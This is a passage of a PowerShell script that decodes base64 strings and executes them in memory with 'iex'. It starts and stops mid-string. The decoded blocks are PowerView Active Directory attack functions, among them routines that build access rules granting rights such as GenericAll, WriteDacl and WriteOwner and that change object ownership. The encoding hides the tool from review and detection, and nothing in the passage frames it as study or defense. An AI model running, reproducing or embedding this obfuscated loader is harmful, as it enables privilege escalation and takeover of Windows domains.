ZSknIDogJF8iCiAgICAgICAgICAgICAgICB9CiAgICAgICAgICAgIH0KICAgICAgICB9CiAgICB9Cn0K")))

iex ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("ZnVuY3Rpb24gQ29udmVydEZyb20tTERBUExvZ29uSG91cnMgewogICAgW0RpYWdub3N0aWNzLkNvZGVBbmFseXNpcy5TdXBwcmVzc01lc3NhZ2VBdHRyaWJ1dGUoJ1BTVXNlRGVjbGFyZWRWYXJzTW9yZVRoYW5Bc3NpZ25tZW50cycsICcnKV0KICAgIFtEaWFnbm9zdGljcy5Db2RlQW5hbHlzaXMuU3VwcHJlc3NNZXNzYWdlQXR0cmlidXRlKCdQU1Nob3VsZFByb2Nlc3MnLCAnJyldCiAgICBbT3V0cHV0VHlwZSgnUG93ZXJWaWV3LkxvZ29uSG91cnMnKV0KICAgIFtDbWRsZXRCaW5kaW5nKCldCiAgICBQYXJhbSAoCiAgICAgICAgW1BhcmFtZXRlciggVmFsdWVGcm9tUGlwZWxpbmUgPSAkVHJ1ZSwgVmFsdWVGcm9tUGlwZWxpbmVCeVByb3BlcnR5TmFtZSA9ICRUcnVlKV0KICAgICAgICBbVmFsaWRhdGVOb3ROdWxsT3JFbXB0eSgpXQogICAgICAgIFtieXRlW11dCiAgICAgICAgJExvZ29uSG91cnNBcnJheQogICAgKQogICAgQmVnaW4gewogICAgICAgIGlmKCRMb2dvbkhvdXJzQXJyYXkuQ291bnQgLW5lIDIxKSB7CiAgICAgICAgICAgIHRocm93ICJMb2dvbkhvdXJzQXJyYXkgaXMgdGhlIGluY29ycmVjdCBsZW5ndGgiCiAgICAgICAgfQogICAgICAgIGZ1bmN0aW9uIENvbnZlcnRUby1Mb2dvbkhvdXJzQXJyYXkgewogICAgICAgICAgICBQYXJhbSAoCiAgICAgICAgICAgICAgICBbaW50W11dCiAgICAgICAgICAgICAgICAkSG91cnNBcnIKICAgICAgICAgICAgKQogICAgICAgICAgICAkTG9nb25Ib3VycyA9IE5ldy1PYmplY3QgYm9vbFtdIDI0CiAgICAgICAgICAgIGZvcigkaT0wOyAkaSAtbHQgMzsgJGkrKykgewogICAgICAgICAgICAgICAgJEJ5dGUgPSAkSG91cnNBcnJbJGldCiAgICAgICAgICAgICAgICAkT2Zmc2V0ID0gJGkgKiA4CiAgICAgICAgICAgICAgICAkU3RyID0gW0NvbnZlcnRdOjpUb1N0cmluZygkQnl0ZSwyKS5QYWRMZWZ0KDgsJzAnKQogICAgICAgICAgICAgICAgJExvZ29uSG91cnNbJE9mZnNldCswXSA9IFtib29sXSBbY29udmVydF06OlRvSW50MzIoW3N0cmluZ10kU3RyWzddKQogICAgICAgICAgICAgICAgJExvZ29uSG91cnNbJE9mZnNldCsxXSA9IFtib29sXSBbY29udmVydF06OlRvSW50MzIoW3N0cmluZ10kU3RyWzZdKQogICAgICAgICAgICAgICAgJExvZ29uSG91cnNbJE9mZnNldCsyXSA9IFtib29sXSBbY29udmVydF06OlRvSW50MzIoW3N0cmluZ10kU3RyWzVdKQogICAgICAgICAgICAgICAgJExvZ29uSG91cnNbJE9mZnNldCszXSA9IFtib29sXSBbY29udmVydF06OlRvSW50MzIoW3N0cmluZ10kU3RyWzRdKQogICAgICAgICAgICAgICAgJExvZ29uSG91cnNbJE9mZnNldCs0XSA9IFtib29sXSBbY29udmVydF06OlRvSW50MzIoW3N0cmluZ10kU3RyWzNdKQogICAgICAgICAgICAgICAgJExvZ29uSG91cnNbJE9mZnNldCs1XSA9IFtib29sXSBbY29udmVydF06OlRvSW50MzIoW3N0cmluZ10kU3RyWzJdKQogICAgICAgICAgICAgICAgJExvZ29uSG91cnNbJE9mZnNldCs2XSA9IFtib29sXSBbY29udmVydF06OlRvSW50MzIoW3N0cmluZ10kU3RyWzFdKQogICAgICAgICAgICAgICAgJExvZ29uSG91cnNbJE9mZnNldCs3XSA9IFtib29sXSBbY29udmVydF06OlRvSW50MzIoW3N0cmluZ10kU3RyWzBdKQogICAgICAgICAgICB9CiAgICAgICAgICAgICRMb2dvbkhvdXJzCiAgICAgICAgfQogICAgfQogICAgUHJvY2VzcyB7CiAgICAgICAgJE91dHB1dCA9IEB7CiAgICAgICAgICAgIFN1bmRheSA9IENvbnZlcnRUby1Mb2dvbkhvdXJzQXJyYXkgLUhvdXJzQXJyICRMb2dvbkhvdXJzQXJyYXlbMC4uMl0KICAgICAgICAgICAgTW9uZGF5ID0gQ29udmVydFRvLUxvZ29uSG91cnNBcnJheSAtSG91cnNBcnIgJExvZ29uSG91cnNBcnJheVszLi41XQogICAgICAgICAgICBUdWVzZGF5ID0gQ29udmVydFRvLUxvZ29uSG91cnNBcnJheSAtSG91cnNBcnIgJExvZ29uSG91cnNBcnJheVs2Li44XQogICAgICAgICAgICBXZWRuZXNkYXkgPSBDb252ZXJ0VG8tTG9nb25Ib3Vyc0FycmF5IC1Ib3Vyc0FyciAkTG9nb25Ib3Vyc0FycmF5WzkuLjExXQogICAgICAgICAgICBUaHVycyA9IENvbnZlcnRUby1Mb2dvbkhvdXJzQXJyYXkgLUhvdXJzQXJyICRMb2dvbkhvdXJzQXJyYXlbMTIuLjE0XQogICAgICAgICAgICBGcmlkYXkgPSBDb252ZXJ0VG8tTG9nb25Ib3Vyc0FycmF5IC1Ib3Vyc0FyciAkTG9nb25Ib3Vyc0FycmF5WzE1Li4xN10KICAgICAgICAgICAgU2F0dXJkYXkgPSBDb252ZXJ0VG8tTG9nb25Ib3Vyc0FycmF5IC1Ib3Vyc0FyciAkTG9nb25Ib3Vyc0FycmF5WzE4Li4yMF0KICAgICAgICB9CiAgICAgICAgJE91dHB1dCA9IE5ldy1PYmplY3QgUFNPYmplY3QgLVByb3BlcnR5ICRPdXRwdXQKICAgICAgICAkT3V0cHV0LlBTT2JqZWN0LlR5cGVOYW1lcy5JbnNlcnQoMCwgJ1Bvd2VyVmlldy5Mb2dvbkhvdXJzJykKICAgICAgICAkT3V0cHV0CiAgICB9Cn0K")))

iex ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("ZnVuY3Rpb24gTmV3LUFET2JqZWN0QWNjZXNzQ29udHJvbEVudHJ5IHsKICAgIFtEaWFnbm9zdGljcy5Db2RlQW5hbHlzaXMuU3VwcHJlc3NNZXNzYWdlQXR0cmlidXRlKCdQU1VzZVNob3VsZFByb2Nlc3NGb3JTdGF0ZUNoYW5naW5nRnVuY3Rpb25zJywgJycpXQogICAgW0RpYWdub3N0aWNzLkNvZGVBbmFseXNpcy5TdXBwcmVzc01lc3NhZ2VBdHRyaWJ1dGUoJ1BTU2hvdWxkUHJvY2VzcycsICcnKV0KICAgIFtPdXRwdXRUeXBlKCdTeXN0ZW0uU2VjdXJpdHkuQWNjZXNzQ29udHJvbC5BdXRob3JpemF0aW9uUnVsZScpXQogICAgW0NtZGxldEJpbmRpbmcoKV0KICAgIFBhcmFtICgKICAgICAgICBbUGFyYW1ldGVyKFBvc2l0aW9uID0gMCwgVmFsdWVGcm9tUGlwZWxpbmUgPSAkVHJ1ZSwgVmFsdWVGcm9tUGlwZWxpbmVCeVByb3BlcnR5TmFtZSA9ICRUcnVlLCBNYW5kYXRvcnkgPSAkVHJ1ZSldCiAgICAgICAgW0FsaWFzKCdEaXN0aW5ndWlzaGVkTmFtZScsICdTYW1BY2NvdW50TmFtZScsICdOYW1lJyldCiAgICAgICAgW1N0cmluZ10KICAgICAgICAkUHJpbmNpcGFsSWRlbnRpdHksCiAgICAgICAgW1ZhbGlkYXRlTm90TnVsbE9yRW1wdHkoKV0KICAgICAgICBbU3RyaW5nXQogICAgICAgICRQcmluY2lwYWxEb21haW4sCiAgICAgICAgW1ZhbGlkYXRlTm90TnVsbE9yRW1wdHkoKV0KICAgICAgICBbQWxpYXMoJ0RvbWFpbkNvbnRyb2xsZXInKV0KICAgICAgICBbU3RyaW5nXQogICAgICAgICRTZXJ2ZXIsCiAgICAgICAgW1ZhbGlkYXRlU2V0KCdCYXNlJywgJ09uZUxldmVsJywgJ1N1YnRyZWUnKV0KICAgICAgICBbU3RyaW5nXQogICAgICAgICRTZWFyY2hTY29wZSA9ICdTdWJ0cmVlJywKICAgICAgICBbVmFsaWRhdGVSYW5nZSgxLCAxMDAwMCldCiAgICAgICAgW0ludF0KICAgICAgICAkUmVzdWx0UGFnZVNpemUgPSAyMDAsCiAgICAgICAgW1ZhbGlkYXRlUmFuZ2UoMSwgMTAwMDApXQogICAgICAgIFtJbnRdCiAgICAgICAgJFNlcnZlclRpbWVMaW1pdCwKICAgICAgICBbU3dpdGNoXQogICAgICAgICRUb21ic3RvbmUsCiAgICAgICAgW01hbmFnZW1lbnQuQXV0b21hdGlvbi5QU0NyZWRlbnRpYWxdCiAgICAgICAgW01hbmFnZW1lbnQuQXV0b21hdGlvbi5DcmVkZW50aWFsQXR0cmlidXRlKCldCiAgICAgICAgJENyZWRlbnRpYWwgPSBbTWFuYWdlbWVudC5BdXRvbWF0aW9uLlBTQ3JlZGVudGlhbF06OkVtcHR5LAogICAgICAgIFtQYXJhbWV0ZXIoTWFuZGF0b3J5ID0gJFRydWUpXQogICAgICAgIFtWYWxpZGF0ZVNldCgnQWNjZXNzU3lzdGVtU2VjdXJpdHknLCAnQ3JlYXRlQ2hpbGQnLCdEZWxldGUnLCdEZWxldGVDaGlsZCcsJ0RlbGV0ZVRyZWUnLCdFeHRlbmRlZFJpZ2h0JywnR2VuZXJpY0FsbCcsJ0dlbmVyaWNFeGVjdXRlJywnR2VuZXJpY1JlYWQnLCdHZW5lcmljV3JpdGUnLCdMaXN0Q2hpbGRyZW4nLCdMaXN0T2JqZWN0JywnUmVhZENvbnRyb2wnLCdSZWFkUHJvcGVydHknLCdTZWxmJywnU3luY2hyb25pemUnLCdXcml0ZURhY2wnLCdXcml0ZU93bmVyJywnV3JpdGVQcm9wZXJ0eScpXQogICAgICAgICRSaWdodCwKICAgICAgICBbUGFyYW1ldGVyKE1hbmRhdG9yeSA9ICRUcnVlLCBQYXJhbWV0ZXJTZXROYW1lPSdBY2Nlc3NSdWxlVHlwZScpXQogICAgICAgIFtWYWxpZGF0ZVNldCgnQWxsb3cnLCAnRGVueScpXQogICAgICAgIFtTdHJpbmdbXV0KICAgICAgICAkQWNjZXNzQ29udHJvbFR5cGUsCiAgICAgICAgW1BhcmFtZXRlcihNYW5kYXRvcnkgPSAkVHJ1ZSwgUGFyYW1ldGVyU2V0TmFtZT0nQXVkaXRSdWxlVHlwZScpXQogICAgICAgIFtWYWxpZGF0ZVNldCgnU3VjY2VzcycsICdGYWlsdXJlJyldCiAgICAgICAgW1N0cmluZ10KICAgICAgICAkQXVkaXRGbGFnLAogICAgICAgIFtQYXJhbWV0ZXIoTWFuZGF0b3J5ID0gJEZhbHNlLCBQYXJhbWV0ZXJTZXROYW1lPSdBY2Nlc3NSdWxlVHlwZScpXQogICAgICAgIFtQYXJhbWV0ZXIoTWFuZGF0b3J5ID0gJEZhbHNlLCBQYXJhbWV0ZXJTZXROYW1lPSdBdWRpdFJ1bGVUeXBlJyldCiAgICAgICAgW1BhcmFtZXRlcihNYW5kYXRvcnkgPSAkRmFsc2UsIFBhcmFtZXRlclNldE5hbWU9J09iamVjdEd1aWRMb29rdXAnKV0KICAgICAgICBbR3VpZF0KICAgICAgICAkT2JqZWN0VHlwZSwKICAgICAgICBbVmFsaWRhdGVTZXQoJ0FsbCcsICdDaGlsZHJlbicsJ0Rlc2NlbmRlbnRzJywnTm9uZScsJ1NlbGZBbmRDaGlsZHJlbicpXQogICAgICAgIFtTdHJpbmddCiAgICAgICAgJEluaGVyaXRhbmNlVHlwZSwKICAgICAgICBbR3VpZF0KICAgICAgICAkSW5oZXJpdGVkT2JqZWN0VHlwZQogICAgKQogICAgQmVnaW4gewogICAgICAgIGlmICgkUHJpbmNpcGFsSWRlbnRpdHkgLW5vdG1hdGNoICdeUy0xLS4qJykgewogICAgICAgICAgICAkUHJpbmNpcGFsU2VhcmNoZXJBcmd1bWVudHMgPSBAewogICAgICAgICAgICAgICAgJ0lkZW50aXR5JyA9ICRQcmluY2lwYWxJZGVudGl0eQogICAgICAgICAgICAgICAgJ1Byb3BlcnRpZXMnID0gJ2Rpc3Rpbmd1aXNoZWRuYW1lLG9iamVjdHNpZCcKICAgICAgICAgICAgfQogICAgICAgICAgICBpZiAoJFBTQm91bmRQYXJhbWV0ZXJzWydQcmluY2lwYWxEb21haW4nXSkgeyAkUHJpbmNpcGFsU2VhcmNoZXJBcmd1bWVudHNbJ0RvbWFpbiddID0gJFByaW5jaXBhbERvbWFpbiB9CiAgICAgICAgICAgIGlmICgkUFNCb3VuZFBhcmFtZXRlcnNbJ1NlcnZlciddKSB7ICRQcmluY2lwYWxTZWFyY2hlckFyZ3VtZW50c1snU2VydmVyJ10gPSAkU2VydmVyIH0KICAgICAgICAgICAgaWYgKCRQU0JvdW5kUGFyYW1ldGVyc1snU2VhcmNoU2NvcGUnXSkgeyAkUHJpbmNpcGFsU2VhcmNoZXJBcmd1bWVudHNbJ1NlYXJjaFNjb3BlJ10gPSAkU2VhcmNoU2NvcGUgfQogICAgICAgICAgICBpZiAoJFBTQm91bmRQYXJhbWV0ZXJzWydSZXN1bHRQYWdlU2l6ZSddKSB7ICRQcmluY2lwYWxTZWFyY2hlckFyZ3VtZW50c1snUmVzdWx0UGFnZVNpemUnXSA9ICRSZXN1bHRQYWdlU2l6ZSB9CiAgICAgICAgICAgIGlmICgkUFNCb3VuZFBhcmFtZXRlcnNbJ1NlcnZlclRpbWVMaW1pdCddKSB7ICRQcmluY2lwYWxTZWFyY2hlckFyZ3VtZW50c1snU2VydmVyVGltZUxpbWl0J10gPSAkU2VydmVyVGltZUxpbWl0IH0KICAgICAgICAgICAgaWYgKCRQU0JvdW5kUGFyYW1ldGVyc1snVG9tYnN0b25lJ10pIHsgJFByaW5jaXBhbFNlYXJjaGVyQXJndW1lbnRzWydUb21ic3RvbmUnXSA9ICRUb21ic3RvbmUgfQogICAgICAgICAgICBpZiAoJFBTQm91bmRQYXJhbWV0ZXJzWydDcmVkZW50aWFsJ10pIHsgJFByaW5jaXBhbFNlYXJjaGVyQXJndW1lbnRzWydDcmVkZW50aWFsJ10gPSAkQ3JlZGVudGlhbCB9CiAgICAgICAgICAgICRQcmluY2lwYWwgPSBHZXQtRG9tYWluT2JqZWN0IEBQcmluY2lwYWxTZWFyY2hlckFyZ3VtZW50cwogICAgICAgICAgICBpZiAoLW5vdCAkUHJpbmNpcGFsKSB7CiAgICAgICAgICAgICAgICB0aHJvdyAiVW5hYmxlIHRvIHJlc29sdmUgcHJpbmNpcGFsOiAkUHJpbmNpcGFsSWRlbnRpdHkiCiAgICAgICAgICAgIH0KICAgICAgICAgICAgZWxzZWlmKCRQcmluY2lwYWwuQ291bnQgLWd0IDEpIHsKICAgICAgICAgICAgICAgIHRocm93ICJQcmluY2lwYWxJZGVudGl0eSBtYXRjaGVzIG11bHRpcGxlIEFEIG9iamVjdHMsIGJ1dCBvbmx5IG9uZSBpcyBhbGxvd2VkIgogICAgICAgICAgICB9CiAgICAgICAgICAgICRPYmplY3RTaWQgPSAkUHJpbmNpcGFsLm9iamVjdHNpZAogICAgICAgIH0KICAgICAgICBlbHNlIHsKICAgICAgICAgICAgJE9iamVjdFNpZCA9ICRQcmluY2lwYWxJZGVudGl0eQogICAgICAgIH0KICAgICAgICAkQURSaWdodCA9IDAKICAgICAgICBmb3JlYWNoKCRyIGluICRSaWdodCkgewogICAgICAgICAgICAkQURSaWdodCA9ICRBRFJpZ2h0IC1ib3IgKChbU3lzdGVtLkRpcmVjdG9yeVNlcnZpY2VzLkFjdGl2ZURpcmVjdG9yeVJpZ2h0c10kcikudmFsdWVfXykKICAgICAgICB9CiAgICAgICAgJEFEUmlnaHQgPSBbU3lzdGVtLkRpcmVjdG9yeVNlcnZpY2VzLkFjdGl2ZURpcmVjdG9yeVJpZ2h0c10kQURSaWdodAogICAgICAgICRJZGVudGl0eSA9IFtTeXN0ZW0uU2VjdXJpdHkuUHJpbmNpcGFsLklkZW50aXR5UmVmZXJlbmNlXSAoW1N5c3RlbS5TZWN1cml0eS5QcmluY2lwYWwuU2VjdXJpdHlJZGVudGlmaWVyXSRPYmplY3RTaWQpCiAgICB9CiAgICBQcm9jZXNzIHsKICAgICAgICBpZigkUFNDbWRsZXQuUGFyYW1ldGVyU2V0TmFtZSAtZXEgJ0F1ZGl0UnVsZVR5cGUnKSB7CiAgICAgICAgICAgIGlmKCRPYmplY3RUeXBlIC1lcSAkbnVsbCAtYW5kICRJbmhlcml0YW5jZVR5cGUgLWVxIFtTdHJpbmddOjpFbXB0eSAtYW5kICRJbmhlcml0ZWRPYmplY3RUeXBlIC1lcSAkbnVsbCkgewogICAgICAgICAgICAgICAgTmV3LU9iamVjdCBTeXN0ZW0uRGlyZWN0b3J5U2VydmljZXMuQWN0aXZlRGlyZWN0b3J5QXVkaXRSdWxlIC1Bcmd1bWVudExpc3QgJElkZW50aXR5LCAkQURSaWdodCwgJEF1ZGl0RmxhZwogICAgICAgICAgICB9IGVsc2VpZigkT2JqZWN0VHlwZSAtZXEgJG51bGwgLWFuZCAkSW5oZXJpdGFuY2VUeXBlIC1uZSBbU3RyaW5nXTo6RW1wdHkgLWFuZCAkSW5oZXJpdGVkT2JqZWN0VHlwZSAtZXEgJG51bGwpIHsKICAgICAgICAgICAgICAgIE5ldy1PYmplY3QgU3lzdGVtLkRpcmVjdG9yeVNlcnZpY2VzLkFjdGl2ZURpcmVjdG9yeUF1ZGl0UnVsZSAtQXJndW1lbnRMaXN0ICRJZGVudGl0eSwgJEFEUmlnaHQsICRBdWRpdEZsYWcsIChbU3lzdGVtLkRpcmVjdG9yeVNlcnZpY2VzLkFjdGl2ZURpcmVjdG9yeVNlY3VyaXR5SW5oZXJpdGFuY2VdJEluaGVyaXRhbmNlVHlwZSkKICAgICAgICAgICAgfSBlbHNlaWYoJE9iamVjdFR5cGUgLWVxICRudWxsIC1hbmQgJEluaGVyaXRhbmNlVHlwZSAtbmUgW1N0cmluZ106OkVtcHR5IC1hbmQgJEluaGVyaXRlZE9iamVjdFR5cGUgLW5lICRudWxsKSB7CiAgICAgICAgICAgICAgICBOZXctT2JqZWN0IFN5c3RlbS5EaXJlY3RvcnlTZXJ2aWNlcy5BY3RpdmVEaXJlY3RvcnlBdWRpdFJ1bGUgLUFyZ3VtZW50TGlzdCAkSWRlbnRpdHksICRBRFJpZ2h0LCAkQXVkaXRGbGFnLCAoW1N5c3RlbS5EaXJlY3RvcnlTZXJ2aWNlcy5BY3RpdmVEaXJlY3RvcnlTZWN1cml0eUluaGVyaXRhbmNlXSRJbmhlcml0YW5jZVR5cGUpLCAkSW5oZXJpdGVkT2JqZWN0VHlwZQogICAgICAgICAgICB9IGVsc2VpZigkT2JqZWN0VHlwZSAtbmUgJG51bGwgLWFuZCAkSW5oZXJpdGFuY2VUeXBlIC1lcSBbU3RyaW5nXTo6RW1wdHkgLWFuZCAkSW5oZXJpdGVkT2JqZWN0VHlwZSAtZXEgJG51bGwpIHsKICAgICAgICAgICAgICAgIE5ldy1PYmplY3QgU3lzdGVtLkRpcmVjdG9yeVNlcnZpY2VzLkFjdGl2ZURpcmVjdG9yeUF1ZGl0UnVsZSAtQXJndW1lbnRMaXN0ICRJZGVudGl0eSwgJEFEUmlnaHQsICRBdWRpdEZsYWcsICRPYmplY3RUeXBlCiAgICAgICAgICAgIH0gZWxzZWlmKCRPYmplY3RUeXBlIC1uZSAkbnVsbCAtYW5kICRJbmhlcml0YW5jZVR5cGUgLW5lIFtTdHJpbmddOjpFbXB0eSAtYW5kICRJbmhlcml0ZWRPYmplY3RUeXBlIC1lcSAkbnVsbCkgewogICAgICAgICAgICAgICAgTmV3LU9iamVjdCBTeXN0ZW0uRGlyZWN0b3J5U2VydmljZXMuQWN0aXZlRGlyZWN0b3J5QXVkaXRSdWxlIC1Bcmd1bWVudExpc3QgJElkZW50aXR5LCAkQURSaWdodCwgJEF1ZGl0RmxhZywgJE9iamVjdFR5cGUsICRJbmhlcml0YW5jZVR5cGUKICAgICAgICAgICAgfSBlbHNlaWYoJE9iamVjdFR5cGUgLW5lICRudWxsIC1hbmQgJEluaGVyaXRhbmNlVHlwZSAtbmUgW1N0cmluZ106OkVtcHR5IC1hbmQgJEluaGVyaXRlZE9iamVjdFR5cGUgLW5lICRudWxsKSB7CiAgICAgICAgICAgICAgICBOZXctT2JqZWN0IFN5c3RlbS5EaXJlY3RvcnlTZXJ2aWNlcy5BY3RpdmVEaXJlY3RvcnlBdWRpdFJ1bGUgLUFyZ3VtZW50TGlzdCAkSWRlbnRpdHksICRBRFJpZ2h0LCAkQXVkaXRGbGFnLCAkT2JqZWN0VHlwZSwgJEluaGVyaXRhbmNlVHlwZSwgJEluaGVyaXRlZE9iamVjdFR5cGUKICAgICAgICAgICAgfQogICAgICAgIH0KICAgICAgICBlbHNlIHsKICAgICAgICAgICAgaWYoJE9iamVjdFR5cGUgLWVxICRudWxsIC1hbmQgJEluaGVyaXRhbmNlVHlwZSAtZXEgW1N0cmluZ106OkVtcHR5IC1hbmQgJEluaGVyaXRlZE9iamVjdFR5cGUgLWVxICRudWxsKSB7CiAgICAgICAgICAgICAgICBOZXctT2JqZWN0IFN5c3RlbS5EaXJlY3RvcnlTZXJ2aWNlcy5BY3RpdmVEaXJlY3RvcnlBY2Nlc3NSdWxlIC1Bcmd1bWVudExpc3QgJElkZW50aXR5LCAkQURSaWdodCwgJEFjY2Vzc0NvbnRyb2xUeXBlCiAgICAgICAgICAgIH0gZWxzZWlmKCRPYmplY3RUeXBlIC1lcSAkbnVsbCAtYW5kICRJbmhlcml0YW5jZVR5cGUgLW5lIFtTdHJpbmddOjpFbXB0eSAtYW5kICRJbmhlcml0ZWRPYmplY3RUeXBlIC1lcSAkbnVsbCkgewogICAgICAgICAgICAgICAgTmV3LU9iamVjdCBTeXN0ZW0uRGlyZWN0b3J5U2VydmljZXMuQWN0aXZlRGlyZWN0b3J5QWNjZXNzUnVsZSAtQXJndW1lbnRMaXN0ICRJZGVudGl0eSwgJEFEUmlnaHQsICRBY2Nlc3NDb250cm9sVHlwZSwgKFtTeXN0ZW0uRGlyZWN0b3J5U2VydmljZXMuQWN0aXZlRGlyZWN0b3J5U2VjdXJpdHlJbmhlcml0YW5jZV0kSW5oZXJpdGFuY2VUeXBlKQogICAgICAgICAgICB9IGVsc2VpZigkT2JqZWN0VHlwZSAtZXEgJG51bGwgLWFuZCAkSW5oZXJpdGFuY2VUeXBlIC1uZSBbU3RyaW5nXTo6RW1wdHkgLWFuZCAkSW5oZXJpdGVkT2JqZWN0VHlwZSAtbmUgJG51bGwpIHsKICAgICAgICAgICAgICAgIE5ldy1PYmplY3QgU3lzdGVtLkRpcmVjdG9yeVNlcnZpY2VzLkFjdGl2ZURpcmVjdG9yeUFjY2Vzc1J1bGUgLUFyZ3VtZW50TGlzdCAkSWRlbnRpdHksICRBRFJpZ2h0LCAkQWNjZXNzQ29udHJvbFR5cGUsIChbU3lzdGVtLkRpcmVjdG9yeVNlcnZpY2VzLkFjdGl2ZURpcmVjdG9yeVNlY3VyaXR5SW5oZXJpdGFuY2VdJEluaGVyaXRhbmNlVHlwZSksICRJbmhlcml0ZWRPYmplY3RUeXBlCiAgICAgICAgICAgIH0gZWxzZWlmKCRPYmplY3RUeXBlIC1uZSAkbnVsbCAtYW5kICRJbmhlcml0YW5jZVR5cGUgLWVxIFtTdHJpbmddOjpFbXB0eSAtYW5kICRJbmhlcml0ZWRPYmplY3RUeXBlIC1lcSAkbnVsbCkgewogICAgICAgICAgICAgICAgTmV3LU9iamVjdCBTeXN0ZW0uRGlyZWN0b3J5U2VydmljZXMuQWN0aXZlRGlyZWN0b3J5QWNjZXNzUnVsZSAtQXJndW1lbnRMaXN0ICRJZGVudGl0eSwgJEFEUmlnaHQsICRBY2Nlc3NDb250cm9sVHlwZSwgJE9iamVjdFR5cGUKICAgICAgICAgICAgfSBlbHNlaWYoJE9iamVjdFR5cGUgLW5lICRudWxsIC1hbmQgJEluaGVyaXRhbmNlVHlwZSAtbmUgW1N0cmluZ106OkVtcHR5IC1hbmQgJEluaGVyaXRlZE9iamVjdFR5cGUgLWVxICRudWxsKSB7CiAgICAgICAgICAgICAgICBOZXctT2JqZWN0IFN5c3RlbS5EaXJlY3RvcnlTZXJ2aWNlcy5BY3RpdmVEaXJlY3RvcnlBY2Nlc3NSdWxlIC1Bcmd1bWVudExpc3QgJElkZW50aXR5LCAkQURSaWdodCwgJEFjY2Vzc0NvbnRyb2xUeXBlLCAkT2JqZWN0VHlwZSwgJEluaGVyaXRhbmNlVHlwZQogICAgICAgICAgICB9IGVsc2VpZigkT2JqZWN0VHlwZSAtbmUgJG51bGwgLWFuZCAkSW5oZXJpdGFuY2VUeXBlIC1uZSBbU3RyaW5nXTo6RW1wdHkgLWFuZCAkSW5oZXJpdGVkT2JqZWN0VHlwZSAtbmUgJG51bGwpIHsKICAgICAgICAgICAgICAgIE5ldy1PYmplY3QgU3lzdGVtLkRpcmVjdG9yeVNlcnZpY2VzLkFjdGl2ZURpcmVjdG9yeUFjY2Vzc1J1bGUgLUFyZ3VtZW50TGlzdCAkSWRlbnRpdHksICRBRFJpZ2h0LCAkQWNjZXNzQ29udHJvbFR5cGUsICRPYmplY3RUeXBlLCAkSW5oZXJpdGFuY2VUeXBlLCAkSW5oZXJpdGVkT2JqZWN0VHlwZQogICAgICAgICAgICB9CiAgICAgICAgfQogICAgfQp9Cg==")))

iex ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("ZnVuY3Rpb24gU2V0LURvbWFpbk9iamVjdE93bmVyIHsKICAgIFtEaWFnbm9zdGljcy5Db2RlQW5hbHlzaXMuU3VwcHJlc3NNZXNzYWdlQXR0cmlidXRlKCdQU1VzZVNob3VsZFByb2Nlc3NGb3JTdGF0ZUNoYW5naW5nRnVuY3Rpb25zJywgJycpXQogICAgW0RpYWdub3N0aWNzLkNvZGVBbmFseXNpcy5TdXBwcmVzc01lc3NhZ2VBdHRyaWJ1dGUoJ1BTU2hvdWxkUHJvY2VzcycsICcnKV0KICAgIFtDbWRsZXRCaW5kaW5nKCldCiAgICBQYXJhbSgKICAgICAgICBbUGFyYW1ldGVyKFBvc2l0aW9uID0gMCwgTWFuZGF0b3J5ID0gJFRydWUsIFZhbHVlRnJvbVBpcGVsaW5lID0gJFRydWUsIFZhbHVlRnJvbVBpcGVsaW5lQnlQcm9wZXJ0eU5hbWUgPSAkVHJ1ZSldCiAgICAgICAgW0FsaWFzKCdEaXN0aW5ndWlzaGVkTmFtZScsICdTYW1BY2NvdW50TmFtZScsICdOYW1lJyldCiAgICAgICAgW1N0cmluZ10KICAgICAgICAkSWRlbnRpdHksCiAgICAgICAgW1BhcmFtZXRlcihNYW5kYXRvcnkgPSAkVHJ1ZSldCiAgICAgICAgW1ZhbGlkYXRlTm90TnVsbE9yRW1wdHkoKV0KICAgICAgICBbQWxpYXMoJ093bmVyJyldCiAgICAgICAgW1N0cmluZ10KICAgICAgICAkT3duZXJJZGVudGl0eSwKICAgICAgICBbVmFsaWRhdGVOb3ROdWxsT3JFbXB0eSgpXQogICAgICAgIFtTdHJpbmddCiAgICAgICAgJERvbWFpbiwKICAgICAgICBbVmFsaWRhdGVOb3ROdWxsT3JFbXB0eSgpXQogICAgICAgIFtBbGlhcygnRmlsdGVyJyldCiAgICAgICAgW1N0cmluZ10KICAgICAgICAkTERBUEZpbHRlciwKICAgICAgICBbVmFsaWRhdGVOb3ROdWxsT3JFbXB0eSgpXQogICAgICAgIFtBbGlhcygnQURTUGF0aCcpXQogICAgICAgIFtTdHJpbmddCiAgICAgICAgJFNlYXJjaEJhc2UsCiAgICAgICAgW1ZhbGlkYXRlTm90TnVsbE9yRW1wdHkoKV0KICAgICAgICBbQWxpYXMoJ0RvbWFpbkNvbnRyb2xsZXInKV0KICAgICAgICBbU3RyaW5nXQogICAgICAgICRTZXJ2ZXIsCiAgICAgICAgW1ZhbGlkYXRlU2V0KCdCYXNlJywgJ09uZUxldmVsJywgJ1N1YnRyZWUnKV0KICAgICAgICBbU3RyaW5nXQogICAgICAgICRTZWFyY2hTY29wZSA9ICdTdWJ0cmVlJywKICAgICAgICBbVmFsaWRhdGVSYW5nZSgxLCAxMDAwMCldCiAgICAgICAgW0ludF0KICAgICAgICAkUmVzdWx0UGFnZVNpemUgPSAyMDAsCiAgICAgICAgW1ZhbGlkYXRlUmFuZ2UoMSwgMTAwMDApXQogICAgICAgIFtJbnRdCiAgICAgICAgJFNlcnZlclRpbWVMaW1pdCwKICAgICAgICBbU3dpdGNoXQogICAgICAgICRUb21ic3RvbmUsCiAgICAgICAgW01hbmFnZW1lbnQuQXV0b21hdGlvbi5QU0NyZWRlbnRpYWxdCiAgICAgICAgW01hbmFnZW1lbnQuQXV0b21hdGlvbi5DcmVkZW50aWFsQXR0cmlidXRlKCldCiAgICAgICAgJENyZWRlbnRpYWwgPSBbTWFuYWdlbWVudC5BdXRvbWF0aW9uLlBTQ3JlZGVudGlhbF06OkVtcHR5CiAgICApCiAgICBCRUdJTiB7CiAgICAgICAgJFNlYXJjaGVyQXJndW1lbnRzID0gQHt9CiAgICAgICAgaWYgKCRQU0JvdW5kUGFyYW1ldGVyc1snRG9tYWluJ10pIHsgJFNlYXJjaGVyQXJndW1lbnRzWydEb21haW4nXSA9ICREb21haW4gfQogICAgICAgIGlmICgkUFNCb3VuZFBhcmFtZXRlcnNbJ0xEQVBGaWx0ZXInXSkgeyAkU2VhcmNoZXJBcmd1bWVudHNbJ0xEQVBGaWx0ZXInXSA9ICRMREFQRmlsdGVyIH0KICAgICAgICBpZiAoJFBTQm9